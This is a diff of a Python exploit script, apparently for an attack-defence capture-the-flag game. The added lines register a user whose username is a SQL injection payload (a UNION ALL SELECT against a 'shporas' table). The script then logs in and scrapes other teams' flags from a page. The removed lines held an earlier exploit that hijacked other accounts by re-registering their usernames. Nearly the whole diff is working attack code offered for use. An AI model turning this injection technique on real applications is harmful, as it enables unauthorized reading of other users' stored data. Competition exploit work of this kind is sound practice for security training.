@@ -6,11 +6,12 @@ import re
 import random
 import json
 import hashlib
+import string
 
 flagRegEx = re.compile(r'[A-Za-z0-9]{31}=')
 
-our_host = "10.80.3.2"		# define out host
-port = 37000 				# define port of service
+our_host = "10.136.181.1"		# define out host
+port = 5005 					# define port of service
 
 alph = 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM0123456789'
 printable = string.printable
@@ -28,29 +29,19 @@ def main():
 
 	# do not forgot about strip(), split(), replace() - functions to parsing
 
-	host = "10.80.4.2"				# DEBUG mode
-	url = f'http://{host}:{port}/'
 	
-	u_name = idgen(8)
+	rand_string = idgen(5)
+	u_name = f'" UNION ALL SELECT NULL, content, NULL, NULL, NULL, NULL, NULL FROM shporas WHERE "{rand_string}"="{rand_string}'
 	u_pswd = idgen(12)
 
 	# print(u_name, u_pswd)
 
 	register(u_name, u_pswd)
 	sess = login(u_name, u_pswd)
-	logins = get_logins(sess)
+	flags = get_flags(sess)
 
-	# print(logins)
-
-	for u_name in logins:
-
-		register(u_name, u_pswd)
-		sess = login(u_name, u_pswd)
-		home = sess.get(url).text
-		flag_list = flagRegEx.findall( home )
-		
-		print(*flag_list, sep="\n", flush=True)
-		sys.stdout.flush() 	# after print
+	print(*flags, sep="\n", flush=True)
+	sys.stdout.flush() 	# after print
 
 
 def idgen( size = 8, chars=alph ):
@@ -59,9 +50,9 @@ def idgen( size = 8, chars=alph ):
 
 def register(u_name: str, u_pswd: str):
 	resp = requests.post(
-		url+"api/register",
-		json={
-			"login": u_name,
+		host+"sign-up",
+		data={
+			"username": u_name,
 			"password": u_pswd
 		}
 	).text
@@ -70,27 +61,25 @@ def register(u_name: str, u_pswd: str):
 def login(u_name: str, u_pswd: str):
 	s = requests.Session()
 	resp = s.post(
-		url+"api/login",
-		json={
-		"login": u_name,
+		host+"login",
+		data={
+		"username": u_name,
 		"password": u_pswd
 		}
 	).text
 	return s
 
 
-def get_logins(s):
-	logins = []
-	for i in range(1, 17):
-		resp = s.get(url+f"specific.html?img={str(i).zfill(2)}")
-		logins += re.findall('<div class="title h5" style="margin: 20px"><b>(.*)</b></div>', resp.text)
-	return logins
+def get_flags(s):
+	resp = s.get(host+"my-shporas")
+	# print(resp.text)
+	return flagRegEx.findall( resp.text )
 
 
 if __name__ == '__main__':
 	
 	if len(sys.argv) > 1:
-		host = sys.argv[1]
+		host = f"http://{sys.argv[1]}:5005/"
 	else:
 		print(f"Usage: python3 {sys.argv[0]} <host>")
 		sys.exit(-1)
